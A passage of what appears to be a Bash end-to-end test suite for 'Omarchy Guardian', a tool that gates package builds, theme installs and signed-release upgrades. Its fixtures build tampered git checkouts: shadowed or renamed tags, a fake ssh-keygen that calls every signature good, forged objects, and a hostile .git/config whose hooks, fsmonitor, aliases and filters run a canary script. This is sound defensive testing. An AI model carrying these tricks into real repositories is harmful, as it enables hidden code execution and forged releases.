    recipe $'if [ -n "$HOME" ]; then\n    source=(hello.sh)\nfi\nsha256sums=(SKIP)' "$package"
    jail_gate --noconfirm
    expect 'a recipe whose sources cannot be followed is not confirmed' 2 "$?"
    expect_output 'the gate says what it cannot follow' 'where Guardian cannot follow'
    expect_output 'and that it was not confirmed' 'NOT CONFIRMED'
    check 'makepkg was not started' absent "$built"
    recipe $'source=(hello.sh tool)\nsha256sums=(SKIP SKIP)' \
        'package() { install -Dm755 "$srcdir/tool" "$pkgdir/usr/bin/guardian-e2e"; }'
    cp -- /usr/bin/true "$build/tool"
    jail_gate --noconfirm
    expect 'a package of a prebuilt program is not confirmed' 2 "$?"
    expect_output 'the gate names the prebuilt program' 'prebuilt program(s) nobody reviewed'
    expect_output 'and that it was not confirmed' 'NOT CONFIRMED'
    check 'makepkg was not started' absent "$built"
    write_user_config
}

###############################################################################
# Theme and plugin commands: the PATH wrappers and the Bash interceptor
###############################################################################
ROUTE_LOG=$E2E/route.log

# with_stand_ins <script> <copy>: the script with Guardian's and Omarchy's
# fixed directories pointed at the recording stand-ins, and nothing else
# changed.
with_stand_ins() {
    sed -e "s|/usr/lib/omarchy-guardian|$E2E/lib|g" -e "s|/usr/share/omarchy/bin|$E2E/omarchy-bin|g" \
        -- "$1" >"$2"
    if grep -qE '/usr/lib/omarchy-guardian|/usr/share/omarchy/bin' "$2" || cmp -s -- "$1" "$2"; then
        printf 'FAIL %s could not be pointed at the stand-ins\n' "$1"
        FAILURES=$((FAILURES + 1))
    fi
}

# expect_route <label> <what must have run> <command...>
expect_route() {
    local label=$1 want=$2 got
    shift 2
    : >"$ROUTE_LOG"
    "$@" >/dev/null 2>&1 </dev/null
    got=$(<"$ROUTE_LOG")
    if [[ $got == "$want" ]]; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s: ran "%s", expected "%s"\n' "$label" "$got" "$want"
        FAILURES=$((FAILURES + 1))
    fi
}

# routing <how>: `how` runs a command line as the wrappers on PATH, or as
# the functions of the Bash interceptor, would.
routing() {
    local how=$1 url=https://example.test/theme.git
    expect_route "$how: omarchy theme install goes to Guardian" "guardian-theme install $url" \
        "$how" omarchy theme install "$url"
    expect_route "$how: omarchy theme-install goes to Guardian" "guardian-theme install $url" \
        "$how" omarchy theme-install "$url"
    expect_route "$how: omarchy theme update goes to Guardian" 'guardian-theme update' \
        "$how" omarchy theme update
    expect_route "$how: omarchy plugin add goes to Guardian" "guardian-plugin add $url" \
        "$how" omarchy plugin add "$url"
    expect_route "$how: omarchy plugin install goes to Guardian" "guardian-plugin install $url" \
        "$how" omarchy plugin install "$url"
    expect_route "$how: omarchy plugin-update goes to Guardian" 'guardian-plugin update' \
        "$how" omarchy plugin-update
    expect_route "$how: omarchy-theme-install goes to Guardian" "guardian-theme install $url" \
        "$how" omarchy-theme-install "$url"
    expect_route "$how: omarchy-theme-update goes to Guardian" 'guardian-theme update' \
        "$how" omarchy-theme-update
    expect_route "$how: omarchy-plugin-add goes to Guardian" "guardian-plugin add $url" \
        "$how" omarchy-plugin-add "$url"
    expect_route "$how: omarchy-plugin-update goes to Guardian" 'guardian-plugin update' \
        "$how" omarchy-plugin-update
    # `-h` after `--` installs, so it is no request for help.
    expect_route "$how: an install with -h after -- still goes to Guardian" "guardian-theme install $url -- -h" \
        "$how" omarchy theme install "$url" -- -h
    expect_route "$how: help is Omarchy's own" 'omarchy theme install --help' \
        "$how" omarchy theme install --help
    expect_route "$how: help for the command by name is Omarchy's own" 'omarchy theme install --help' \
        "$how" omarchy-theme-install -h
    expect_route "$how: every other omarchy command goes straight through" 'omarchy update --yes' \
        "$how" omarchy update --yes
}

on_path() {
    PATH="$E2E/lib/bin:$E2E/omarchy-bin:/usr/bin:/bin" "$@"
}

in_bash() {
    PATH="$E2E/omarchy-bin:/usr/bin:/bin" /usr/bin/bash --norc --noprofile -c \
        'source "$1" && shift && "$@"' _ "$E2E/lib/omarchy-bash-interceptor.sh" "$@"
}

# The `omarchy` wrapper finds Omarchy's own dispatcher by full path, in
# either place Omarchy keeps it, and never by a PATH lookup.
dispatcher() {
    local wrapper=$E2E/lib/bin/omarchy-moved planted=$E2E/planted url=https://example.test/theme.git
    mkdir -p "$E2E/usr-bin" "$planted"
    sed -e "s|/usr/bin/omarchy|$E2E/usr-bin/omarchy|g" -e "s|/etc/omarchy.conf|$E2E/omarchy.conf|g" \
        -- "$E2E/lib/bin/omarchy" >"$wrapper"
    chmod 755 "$wrapper"
    printf '#!/bin/sh\nprintf "%%s\\n" "moved-omarchy $*" >>%q\n' "$ROUTE_LOG" >"$E2E/usr-bin/omarchy"
    printf '#!/bin/sh\nprintf "%%s\\n" "planted-omarchy $*" >>%q\n' "$ROUTE_LOG" >"$planted/omarchy"
    chmod 755 "$E2E/usr-bin/omarchy" "$planted/omarchy"
    planted_first() { PATH="$planted:/usr/bin:/bin" "$@"; }

    expect_route 'the dispatcher in its usual place is the one run' 'omarchy update --yes' \
        planted_first "$wrapper" update --yes
    mv -- "$E2E/omarchy-bin/omarchy" "$E2E/omarchy-bin/omarchy.away"
    expect_route 'a dispatcher that moved to the other place is still found' 'moved-omarchy update --yes' \
        planted_first "$wrapper" update --yes
    rm -f -- "$E2E/usr-bin/omarchy"
    : >"$ROUTE_LOG"
    planted_first "$wrapper" update --yes >"$OUT" 2>&1 </dev/null
    expect 'with no dispatcher in either place the wrapper stops' 127 "$?"
    expect_output 'and says so in one line' "Omarchy's own omarchy command is not at"
    check 'an omarchy planted on PATH is never run instead' test ! -s "$ROUTE_LOG"
    expect_route 'a theme install still goes to Guardian then' "guardian-theme install $url" \
        planted_first "$wrapper" theme install "$url"

    # `omarchy dev link` names its checkout in /etc/omarchy.conf: only
    # root's file is believed.
    mkdir -p "$E2E/linked/bin"
    printf '#!/bin/sh\nprintf "%%s\\n" "linked-omarchy $*" >>%q\n' "$ROUTE_LOG" >"$E2E/linked/bin/omarchy"
    chmod 755 "$E2E/linked/bin/omarchy"
    mv -- "$E2E/omarchy-bin/omarchy.away" "$E2E/omarchy-bin/omarchy"
    printf 'export OMARCHY_PATH=%q\n' "$E2E/linked" >"$E2E/omarchy.conf"
    if ((IS_ROOT)); then
        expect_route "a checkout linked in root's file is the one run" 'linked-omarchy update --yes' \
            planted_first "$wrapper" update --yes
    else
        expect_route "a link file that is not root's is not believed" 'omarchy update --yes' \
            planted_first "$wrapper" update --yes
    fi
    rm -f -- "$E2E/omarchy.conf"
}

theme_commands() {
    printf '=== theme and plugin commands ===\n'
    local name
    mkdir -p "$E2E/lib/bin" "$E2E/omarchy-bin"
    for name in guardian-theme guardian-plugin; do
        printf '#!/bin/sh\nprintf "%%s\\n" "%s $*" >>%q\n' "$name" "$ROUTE_LOG" >"$E2E/lib/$name"
        chmod 755 "$E2E/lib/$name"
    done
    for name in omarchy omarchy-theme-install omarchy-theme-update omarchy-plugin-add omarchy-plugin-update; do
        printf '#!/bin/sh\nprintf "%%s\\n" "%s $*" >>%q\n' "$name" "$ROUTE_LOG" >"$E2E/omarchy-bin/$name"
        chmod 755 "$E2E/omarchy-bin/$name"
        with_stand_ins "$PROJECT/integrations/omarchy/bin/$name" "$E2E/lib/bin/$name"
        chmod 755 "$E2E/lib/bin/$name"
    done
    with_stand_ins "$PROJECT/integrations/omarchy/omarchy-bash-interceptor.sh" \
        "$E2E/lib/omarchy-bash-interceptor.sh"
    routing on_path
    routing in_bash
    dispatcher

    # The installer adds the line that loads the interceptor once, and keeps
    # the file as it was before its first edit.
    with_stand_ins "$PROJECT/integrations/omarchy/install-user-interceptor.sh" "$E2E/install-interceptor.sh"
    local line="[[ -r $E2E/lib/omarchy-bash-interceptor.sh ]] && source $E2E/lib/omarchy-bash-interceptor.sh"
    printf '# mine\n' >"$HOME/.bashrc"
    /usr/bin/bash "$E2E/install-interceptor.sh" >"$OUT" 2>&1
    expect 'the interceptor installer runs' 0 "$?"
    /usr/bin/bash "$E2E/install-interceptor.sh" >"$OUT" 2>&1
    expect 'and runs again' 0 "$?"
    check 'the line that loads the interceptor is there once' \
        test "$(grep -cxF -- "$line" "$HOME/.bashrc")" = 1
    check 'the file as it was is kept beside it' \
        test "$(cat "$HOME/.bashrc.guardian-bak" 2>/dev/null)" = '# mine'
}

###############################################################################
# The bar's check that the Bash interceptor is really loaded
###############################################################################
interceptor_state() {
    printf '=== the interceptor presence check ===\n'
    local installed=/usr/lib/omarchy-guardian/install-user-interceptor.sh
    local source_line='[[ -r /usr/lib/omarchy-guardian/omarchy-bash-interceptor.sh ]] && source /usr/lib/omarchy-guardian/omarchy-bash-interceptor.sh'
    if [[ ! -e $installed ]] || ! command -v jq >/dev/null; then
        skip 'interceptor presence check: needs the installed omarchy-guardian package and jq'
        return
    fi
    # state: what `status` says of the theme & plugin gate for this ~/.bashrc.
    state() {
        printf '%s\n' "$1" >"$HOME/.bashrc"
        setsid -w "$BINARY" status </dev/null 2>/dev/null |
            jq -r '.gates[] | select(.label == "Theme & plugin gate") | .state'
    }
    # With Omarchy installed the menu half is off in this throwaway home,
    # so the line alone makes the gate partly on; without it, on.
    counts() { [[ $(state "$source_line") == @(on|partial) ]]; }
    check 'the line that loads the interceptor counts' counts
    check 'the marker without the line does not' \
        test "$(state '# Omarchy Guardian theme command interception')" = off
    check 'a line that is commented out does not' test "$(state "# $source_line")" = off
    # not_effective <~/.bashrc>: the gate is partly on, and the bar says the
    # line is there and does nothing.
    not_effective() {
        [[ $(state "$1") == partial ]] &&
            setsid -w "$BINARY" status </dev/null 2>/dev/null |
            jq -e '.gates[] | select(.label == "Theme & plugin gate") | .detail | test("not effective in Bash")' \
                >/dev/null
    }
    check 'a line after a return is said to be without effect' not_effective $'return\n'"$source_line"
    check 'and so is the line inside a function' not_effective $'f() {\n'"$source_line"$'\n}'
    check 'and a line that only names the file' \
        not_effective 'echo /usr/lib/omarchy-guardian/omarchy-bash-interceptor.sh'
}

###############################################################################
# The file Hyprland loads to put Guardian's commands first on PATH
###############################################################################
hyprland_path() {
    printf '=== the Hyprland PATH file ===\n'
    local file=$PROJECT/integrations/omarchy/hyprland-path.lua lua
    local guardian=/usr/lib/omarchy-guardian/bin omarchy=/usr/share/omarchy/bin
    lua=$(command -v lua || command -v luajit) || {
        skip 'the Hyprland PATH file: needs lua'
        return
    }
    # path_after <PATH Hyprland was started with> [OMARCHY_PATH]: what the
    # file sets PATH to, with Hyprland's `hl.env` standing in as a print.
    path_after() {
        /usr/bin/env -i PATH="$1" ${2:+OMARCHY_PATH="$2"} "$lua" \
            -e 'hl = { env = function(name, value) print(name .. "=" .. value) end }' "$file" 2>&1
    }
    # As Omarchy's envs.lua leaves it: its own commands first, Guardian's
    # (from the uwsm session file) behind them.
    check "Guardian's commands come first, Omarchy's right behind" test \
        "$(path_after "$omarchy:$guardian:/usr/local/bin:/usr/bin")" = \
        "PATH=$guardian:$omarchy:/usr/local/bin:/usr/bin"
    # As Hyprland itself was started, should it not hand its own setting
    # back: Omarchy's directory is placed all the same.
    check "the same from the PATH Hyprland was started with" test \
        "$(path_after "$guardian:/usr/local/bin:/usr/bin")" = \
        "PATH=$guardian:$omarchy:/usr/local/bin:/usr/bin"
    check 'and with neither on it' test "$(path_after /usr/bin)" = "PATH=$guardian:$omarchy:/usr/bin"
    check 'a linked Omarchy checkout keeps its place behind Guardian' test \
        "$(path_after "/x/omarchy/bin:/usr/bin" /x/omarchy/)" = "PATH=$guardian:/x/omarchy/bin:/usr/bin"
    # The line `protect` writes passes over a file that is not there (the
    # package removed, the line left behind) without an error.
    missing_file() {
        [[ $("$lua" -e 'print(pcall(dofile, "/nonexistent/hyprland-path.lua"))' 2>&1) == false* ]]
    }
    check "the line that loads it passes over a missing file" missing_file
}

###############################################################################
# install.sh: what counts as a signed release
###############################################################################
release_check_cases() {
    printf '=== the installer: what counts as a signed release ===\n'
    if ! command -v git >/dev/null || [[ ! -x /usr/bin/ssh-keygen ]]; then
        skip "the installer's release check: needs git and ssh-keygen"
        return
    fi
    local repo=$E2E/release/checkout keys=$E2E/release/keys signers=$E2E/release/allowed_signers
    local -a git=(git -C "$repo" -c user.name=Tester -c user.email=tester@example.test -c gpg.format=ssh
        -c init.defaultBranch=main -c commit.gpgsign=false)
    mkdir -p "$repo" "$keys"
    # The function as install.sh has it, and nothing else of the installer.
    # shellcheck disable=SC1090
    source <(sed -n '/^release_check() {$/,/^}$/p' "$PROJECT/install.sh")
    if ! declare -F release_check >/dev/null; then
        printf 'FAIL install.sh has no release_check to test\n'
        FAILURES=$((FAILURES + 1))
        return
    fi
    ssh-keygen -q -t ed25519 -N '' -C release -f "$keys/release" &&
        ssh-keygen -q -t ed25519 -N '' -C other -f "$keys/other" || {
        printf 'FAIL could not make test keys\n'
        FAILURES=$((FAILURES + 1))
        return
    }
    printf 'release@example.test namespaces="git" %s\n' "$(cat "$keys/release.pub")" >"$signers"
    printf 'other@example.test namespaces="git" %s\n' "$(cat "$keys/other.pub")" >"$keys/other_signers"
    {
        "${git[@]}" init -q &&
            cp -- "$PROJECT/.gitignore" "$repo/.gitignore" &&
            printf 'fn main() {}\n' >"$repo/main.rs" &&
            mkdir -p "$repo/packaging/arch" &&
            printf 'pkgver=1\npkgrel=1\n' >"$repo/packaging/arch/PKGBUILD" &&
            # What the upgrade check starts once the release is verified:
            # here it only says how it was started, and from where.
            printf '#!/bin/bash\n# takes --verified-by-installed\nprintf "installer in %%s without .git: %%s\\n" "$PWD" "$*"\n[[ ! -e .git ]]\n' \
                >"$repo/install.sh" &&
            chmod 755 "$repo/install.sh" &&
            "${git[@]}" add .gitignore main.rs install.sh packaging/arch/PKGBUILD &&
            "${git[@]}" commit -q -m release &&
            "${git[@]}" -c user.signingkey="$keys/release.pub" tag -s -m v1 v1
    } >"$OUT" 2>&1 || {
        printf 'FAIL could not make a signed test release: %s\n' "$(tail -n 3 "$OUT" | tr '\n' ';')"
        FAILURES=$((FAILURES + 1))
        return
    }
    # is <label> <what release_check must start with> [keys file]
    is() {
        local label=$1 want=$2 got
        got=$(release_check "$repo" "${3-$signers}" 2>/dev/null)
        if [[ $got == "$want"* ]]; then
            printf 'ok   %s\n' "$label"
        else
            printf 'FAIL %s: release_check said "%s", expected "%s..."\n' "$label" "$got" "$want"
            FAILURES=$((FAILURES + 1))
        fi
    }

    is 'a release tag signed by a known key, nothing changed or added' 'signed v1'
    is 'without keys the tag is named and not called signed' 'unchecked v1' ''
    # What the build makes is not an added file.
    mkdir -p "$repo/target/release" "$repo/packaging/arch/pkg" "$repo/packaging/arch/src"
    : >"$repo/target/release/x"
    : >"$repo/packaging/arch/pkg/x"
    : >"$repo/packaging/arch/src/x"
    : >"$repo/packaging/arch/omarchy-guardian-1-1-x86_64.pkg.tar.zst"
    is "the build's own output does not make it unsigned" 'signed v1'

    # Files that are not part of the tag: cargo runs the first two, and the
    # package installs the last as the next keys.
    local added
    for added in build.rs .cargo/config.toml rust-toolchain.toml packaging/allowed_signers; do
        mkdir -p "$(dirname -- "$repo/$added")"
        : >"$repo/$added"
        is "an added $added makes it unsigned" 'unsigned this checkout has files that are not part of v1'
        # Hidden from `git status` by the checkout's own exclude file.
        printf '/%s\n/.cargo/\n' "$added" >>"$repo/.git/info/exclude"
        is "and so does one the checkout's exclude file hides" 'unsigned this checkout has files that are not part of v1'
        rm -rf -- "$repo/$added" "$repo/.cargo"
        : >"$repo/.git/info/exclude"
    done
    is 'with them gone it is signed again' 'signed v1'

    printf '// changed\n' >>"$repo/main.rs"
    is 'a changed file makes it unsigned' 'unsigned this checkout has local changes'
    "${git[@]}" checkout -q -- main.rs

    # A tag signed by a key Guardian does not know, in a checkout whose own
    # configuration answers the verification: its own keys file, and a
    # program standing in for ssh-keygen that calls every signature good.
    "${git[@]}" tag -d v1 >/dev/null 2>&1
    "${git[@]}" -c user.signingkey="$keys/other.pub" tag -s -m v1 v1 >"$OUT" 2>&1
    is 'a tag signed by an unknown key is unsigned' 'unsigned v1 is not signed by a release key'
    "${git[@]}" config gpg.ssh.allowedSignersFile "$keys/other_signers"
    fooled() { "${git[@]}" verify-tag v1 >/dev/null 2>&1; }
    check "(the checkout's own keys file does answer a plain git verify-tag)" fooled
    is "the checkout's own keys file is not asked" 'unsigned v1 is not signed by a release key'
    "${git[@]}" config --unset gpg.ssh.allowedSignersFile
    printf '#!/bin/sh\ncase " $* " in\n*" find-principals "*) printf "release@example.test\\n" ;;\n*" verify "*) printf "Good \\"git\\" signature for release@example.test with ED25519 key SHA256:x\\n" ;;\nesac\nexit 0\n' \
        >"$keys/yes-keygen"
    chmod 755 "$keys/yes-keygen"
    "${git[@]}" config gpg.ssh.program "$keys/yes-keygen"
    plain_verify() { "${git[@]}" -c gpg.ssh.allowedSignersFile="$signers" verify-tag v1 >/dev/null 2>&1; }
    check "(the checkout's own verifying program does answer a plain git verify-tag)" plain_verify
    is "the checkout's own verifying program is not asked" 'unsigned v1 is not signed by a release key'
    "${git[@]}" config --unset gpg.ssh.program

    # A commit on top of the release, and a directory that is no checkout.
    "${git[@]}" tag -d v1 >/dev/null 2>&1
    "${git[@]}" -c user.signingkey="$keys/release.pub" tag -s -m v1 v1 >"$OUT" 2>&1
    is 'the release tag signed anew is signed' 'signed v1 release@example.test'
    release_tampered_cases
    printf '// more\n' >>"$repo/main.rs"
    "${git[@]}" commit -q -a -m more
    is 'a commit after the tag is unsigned' 'unsigned commit'
    mkdir -p "$E2E/release/tarball"
    cp -- "$repo/main.rs" "$E2E/release/tarball/"
    repo=$E2E/release/tarball
    # Above the scratch directory there may be a checkout: git must not
    # find one from inside a tarball's directory.
    GIT_CEILING_DIRECTORIES=$E2E/release is 'a directory that is not a git checkout is unsigned' \
        'unsigned this is not a git checkout'
}

# A checkout that was tampered with, against both checks: install.sh's own
# (release_check) and the installed Guardian's upgrade check, which is the
# one that does not rely on the checkout. Called by release_check_cases
# with a clean checkout of the signed release v1 in $repo.
release_tampered_cases() {
    printf '=== a checkout that was tampered with ===\n'
    local upgrade=$PROJECT/integrations/upgrade.sh clean=$repo case_dir tag_id blob other canary tree
    if [[ ! -x /usr/bin/tar || ! -x /usr/bin/vercmp || ! -x /usr/bin/pacman ]]; then
        skip "the installed upgrade check: needs tar, vercmp and pacman"
        return
    fi
    # at <directory> <git arguments>
    at() {
        local dir=$1
        shift
        git -C "$dir" -c user.name=Tester -c user.email=tester@example.test -c gpg.format=ssh \
            -c commit.gpgsign=false "$@"
    }
    # tampered <name>: a fresh copy of the clean checkout to change.
    tampered() {
        repo=$E2E/release/$1
        cp -a -- "$clean" "$repo"
    }
    # up <arguments>: the upgrade check as a copy that is not installed, so
    # it takes the test's key file and installed version. The installed
    # version is 0.5.0-1 unless INSTALLED says otherwise.
    up() {
        GUARDIAN_UPGRADE_TEST_SIGNERS=${SIGNERS_FILE-$signers} \
            GUARDIAN_UPGRADE_TEST_INSTALLED=${INSTALLED-0.5.0-1} \
            GUARDIAN_UPGRADE_TEST_AS_ROOT=1 bash "$upgrade" "$@" >"$OUT" 2>&1
    }
    # exported <file>: the path of <file> in the export the last `up
    # --check --keep` made.
    exported() {
        printf '%s/%s\n' "$(sed -n 's/^Export: //p' "$OUT")" "$1"
    }
    signed_main() { [[ $(cat -- "$(exported main.rs)") == 'fn main() {}' ]]; }
    tag_id=$(at "$clean" rev-parse refs/tags/v1)

    # The genuine release.
    up --check --keep "$clean"
    expect 'upgrade: a release tag signed by a known key is verified' 0 $?
    expect_output 'it names the tag' 'Verified release v1'
    expect_output 'the signer' 'signer  release@example.test (SHA256:'
    expect_output 'and the commit' "commit  $(at "$clean" rev-parse 'v1^{commit}')"
    check 'the export is the signed tree' signed_main
    tree=$(exported '')
    no_extras() { [[ ! -e $tree/target && ! -e $tree/.git && -x $tree/install.sh ]]; }
    check "without the checkout's build output or its .git" no_extras
    up "$clean" v1
    expect 'upgrade: the verified release is handed to its own installer' 0 $?
    expect_output 'which is told what was verified' \
        "without .git: --verified-by-installed=v1:$(at "$clean" rev-parse 'v1^{commit}')"
    expect_output 'and runs in the export, not in the checkout' "installer in $XDG_CACHE_HOME/omarchy-guardian/upgrade."
    up --yes --reinstall "$clean"
    expect_output "the installer's own options are passed on" 'without .git: --yes --reinstall --verified-by-installed=v1:'
    only_kept() { [[ $(find "$XDG_CACHE_HOME/omarchy-guardian" -maxdepth 1 -name 'upgrade.*' | wc -l) == 1 ]]; }
    check 'the private directory is removed afterwards (one was kept on request)' only_kept
    if ((IS_ROOT)); then
        GUARDIAN_UPGRADE_TEST_SIGNERS=$signers bash "$upgrade" --check "$clean" >"$OUT" 2>&1
        expect 'upgrade: refuses to run as root' 1 $?
    fi
    bash "$PROJECT/install.sh" --verified-by-installed=v1 >"$OUT" 2>&1
    expect "install.sh: --verified-by-installed without a commit is refused" 2 $?

    # No installed keys: nothing is verified and nothing is built.
    SIGNERS_FILE=$E2E/release/no-such-keys up "$clean"
    expect 'upgrade: without installed keys nothing is built' 1 $?
    expect_output 'and it says why' 'carries no release keys'
    # An older release than the installed one.
    INSTALLED=2-1 up "$clean"
    expect 'upgrade: a release older than the installed one is refused' 1 $?
    expect_output 'and it says why' 'is older than the installed 2-1'
    INSTALLED=2-1 up --allow-downgrade --check "$clean"
    expect 'unless --allow-downgrade is given' 0 $?
    INSTALLED=1-1 up --check "$clean"
    expect 'the installed version itself is not a downgrade' 0 $?
    INSTALLED='' up --check "$clean"
    expect 'and neither is a first install' 0 $?
    up --check "$clean" 'v1;x'
    expect 'upgrade: a tag name that is not a release name is refused' 1 $?

    # Changed code committed, a plain tag v1 on it, and the genuine signed
    # tag object behind refs/v1, which git looks up before refs/tags/v1.
    tampered shadow
    printf '// changed\n' >>"$repo/main.rs"
    at "$repo" commit -q -a -m changed
    at "$repo" update-ref -d refs/tags/v1
    at "$repo" tag v1
    at "$repo" update-ref refs/v1 "$tag_id"
    shadow_fools() {
        [[ $(at "$repo" describe --exact-match --tags HEAD 2>/dev/null) == v1 ]] &&
            at "$repo" -c gpg.ssh.allowedSignersFile="$signers" verify-tag v1 >/dev/null 2>&1
    }
    check '(a plain tag at HEAD with refs/v1 behind it does answer git describe and git verify-tag v1)' shadow_fools
    is 'install.sh: a plain tag with the signed tag behind refs/<name> is unsigned' 'unsigned commit'
    up --check "$repo" v1
    expect 'upgrade: and is refused' 1 $?
    expect_output 'as not a signed tag' 'v1 is not a signed tag'
    up --check "$repo"
    expect 'upgrade: with no tag named, too' 1 $?

    # The genuine signed tag of v1 stored under the name of a newer release.
    tampered renamed
    at "$repo" update-ref refs/tags/v9 "$tag_id"
    is 'install.sh: a signed tag stored under another name is unsigned' 'unsigned the tag stored as v9'
    up --check "$repo" v9
    expect 'upgrade: a signed tag stored under another name is refused' 1 $?
    expect_output 'and it says what the tag really is' "the tag stored as v9 is really the tag 'v1'"
    up --check "$repo"
    expect 'upgrade: with no tag named it is passed over for the genuine one' 0 $?
    expect_output 'which is v1' 'Verified release v1'

    # A tag signed by a key the installed Guardian does not know.
    tampered stranger
    at "$repo" tag -d v1 >/dev/null 2>&1
    at "$repo" -c user.signingkey="$keys/other.pub" tag -s -m v1 v1 >/dev/null 2>&1
    up --check "$repo"
    expect 'upgrade: a tag signed by an unknown key is refused' 1 $?
    up --check "$repo" v1
    expect_output 'and it says why' 'v1 is not signed by a release key the installed Guardian knows'

    # core.worktree names a clean copy inside .git: git status looks there,
    # while the build would use the directory the installer is in.
    tampered elsewhere
    mkdir -p "$repo/.git/clean"
    cp -a -- "$repo/main.rs" "$repo/.gitignore" "$repo/install.sh" "$repo/packaging" "$repo/.git/clean/"
    at "$repo" config core.worktree "$repo/.git/clean"
    printf '// changed\n' >>"$repo/main.rs"
    looks_clean() { [[ -z $(at "$repo" status --porcelain 2>/dev/null) ]]; }
    check '(with core.worktree pointing at a clean copy, git status sees no change)' looks_clean
    is 'install.sh: a changed file behind core.worktree is found' 'unsigned this checkout has local changes on top of v1: main.rs'
    at "$repo" --work-tree="$repo" checkout -q -- main.rs
    : >"$repo/build.rs"
    is 'install.sh: and so is an added one' 'unsigned this checkout has files that are not part of v1: build.rs'
    printf '// changed\n' >>"$repo/main.rs"
    up --check --keep "$repo"
    expect 'upgrade: the release is verified whatever core.worktree says' 0 $?
    check 'and the export has the signed file, not the changed one' signed_main
    tree=$(exported '')
    check 'and not the added one' test ! -e "$tree/build.rs"

    # A changed file the index is told to pass over, and an added file the
    # index lists, so that it is not "untracked".
    tampered index
    at "$repo" update-index --skip-worktree main.rs
    printf '// changed\n' >>"$repo/main.rs"
    check '(a changed file marked skip-worktree is not in git status)' looks_clean
    is 'install.sh: a changed file marked skip-worktree is found' 'unsigned this checkout has local changes on top of v1: main.rs'
    at "$repo" update-index --no-skip-worktree main.rs
    at "$repo" checkout -q -- main.rs
    : >"$repo/build.rs"
    at "$repo" add build.rs
    not_untracked() { [[ -z $(at "$repo" ls-files --others --exclude-standard 2>/dev/null) ]]; }
    check '(an added file the index lists is not untracked)' not_untracked
    is 'install.sh: an added file the index lists is found' 'unsigned this checkout has files that are not part of v1: build.rs'
    at "$repo" update-index --skip-worktree main.rs
    printf '// changed\n' >>"$repo/main.rs"
    up --check --keep "$repo"
    expect 'upgrade: the release is verified whatever the index says' 0 $?
    check 'and the export has the signed file' signed_main
    tree=$(exported '')
    check 'and not the added one' test ! -e "$tree/build.rs"

    # A file whose mode changed, and a file replaced by a link to itself
    # elsewhere: neither changes a byte of content.
    tampered modes
    chmod 755 "$repo/main.rs"
    is 'install.sh: a file made executable is found' 'unsigned this checkout has local changes on top of v1: main.rs'
    chmod 644 "$repo/main.rs"
    cp -- "$repo/main.rs" "$E2E/release/main-elsewhere.rs"
    ln -sf -- "$E2E/release/main-elsewhere.rs" "$repo/main.rs"
    is 'install.sh: a file replaced by a link is found' 'unsigned this checkout has local changes on top of v1: main.rs'

    # A checkout whose configuration runs programs: each would leave the
    # canary behind. The release itself is untouched.
    tampered hostile
    canary=$E2E/release/canary
    mkdir -p "$repo/.git/evil-hooks"
    printf '#!/bin/sh\n: >%q\nexit 0\n' "$canary" >"$repo/.git/evil"
    chmod 755 "$repo/.git/evil"
    for other in reference-transaction post-checkout pre-auto-gc post-index-change; do
        cp -- "$repo/.git/evil" "$repo/.git/evil-hooks/$other"
    done
    cat >"$repo/.git/evil.inc" <<EOF
[gpg "ssh"]
	program = $repo/.git/evil
[gpg]
	program = $repo/.git/evil
[filter "evil"]
	clean = $repo/.git/evil
	smudge = $repo/.git/evil
	process = $repo/.git/evil
EOF
    cat >>"$repo/.git/config" <<EOF
[uploadpack]
	packObjectsHook = $repo/.git/evil
[core]
	fsmonitor = $repo/.git/evil
	hooksPath = $repo/.git/evil-hooks
	sshCommand = $repo/.git/evil
	pager = $repo/.git/evil
	alternateRefsCommand = $repo/.git/evil
[include]
	path = $repo/.git/evil.inc
[alias]
	rev-parse = !$repo/.git/evil
	cat-file = !$repo/.git/evil
	fetch = !$repo/.git/evil
	verify-tag = !$repo/.git/evil
EOF
    printf '* filter=evil\n' >"$repo/.git/info/attributes"
    at "$repo" status >/dev/null 2>&1
    check "(the checkout's configuration does run its program for a plain git status)" test -e "$canary"
    rm -f -- "$canary"
    is "install.sh: the release is still told apart" 'signed v1 release@example.test'
    check "install.sh: and nothing the checkout's configuration names was run" test ! -e "$canary"
    rm -f -- "$canary"
    up --check "$repo"
    expect "upgrade: a checkout with a hostile configuration is verified as the release it is" 0 $?
    up "$repo" v1
    expect 'upgrade: and handed to the signed installer' 0 $?
    check "upgrade: and nothing the checkout's configuration names was run" test ! -e "$canary"

    # An object file that is not what its name says: the signed tree names
    # main.rs by its id, and the file stored under that id holds other
    # content.
    tampered forged
    blob=$(at "$repo" rev-parse 'v1:main.rs')
    other=$(at "$repo" rev-parse 'v1:.gitignore')
    if [[ -f $repo/.git/objects/${blob:0:2}/${blob:2} && -f $repo/.git/objects/${other:0:2}/${other:2} ]]; then
        chmod u+w "$repo/.git/objects/${blob:0:2}/${blob:2}"
        cp -- "$repo/.git/objects/${other:0:2}/${other:2}" "$repo/.git/objects/${blob:0:2}/${blob:2}"
        up --check "$repo" v1
        expect 'upgrade: an object stored under the id of another is refused' 1 $?
        expect_output 'because it could not be copied intact' 'could not be copied intact'
    else
        skip 'a forged object: the test checkout has no loose objects'
    fi

    # The same release with its objects and refs packed.
    tampered packed
    at "$repo" gc -q >/dev/null 2>&1
    packed_refs() { [[ ! -e $repo/.git/refs/tags/v1 ]] && grep -q ' refs/tags/v1$' "$repo/.git/packed-refs"; }
    check '(git gc packed the tag)' packed_refs
    up --check "$repo"
    expect 'upgrade: a packed checkout is verified too' 0 $?

    # A linked worktree: its .git is a file that names another directory.
    mkdir -p "$E2E/release/linked"
    printf 'gitdir: %s/.git\n' "$clean" >"$E2E/release/linked/.git"
    repo=$E2E/release/linked
    is 'install.sh: a .git that is a file is unsigned' 'unsigned its .git is not a directory'
    up --check "$repo"
    expect 'upgrade: a .git that is a file is refused' 1 $?
    expect_output 'and it says why' 'is not a directory'
    up --check "$E2E/release/keys"
    expect 'upgrade: a directory that is no checkout is refused' 1 $?
    repo=$clean
}

if [[ -n $AS_ROOT ]]; then
    # The pacman gate's cases as root of a user namespace, for the suite
    # that started this one (see pacman_gate_as_root).
    pacman_gate
    printf '%d\n' "$SKIPPED" >"$E2E/skipped"
    if [[ -e $AI_CALLED ]]; then
        printf 'FAIL a reviewer was started as root: %s\n' "$(tr '\n' ';' <"$AI_CALLED")"
        FAILURES=$((FAILURES + 1))
    fi
    exit $((FAILURES > 0))
fi

hook_script
pacman_gate
user_gates
makepkg_jail
theme_commands
interceptor_state
hyprland_path
release_check_cases

printf '\n'
if [[ -e $AI_CALLED ]]; then
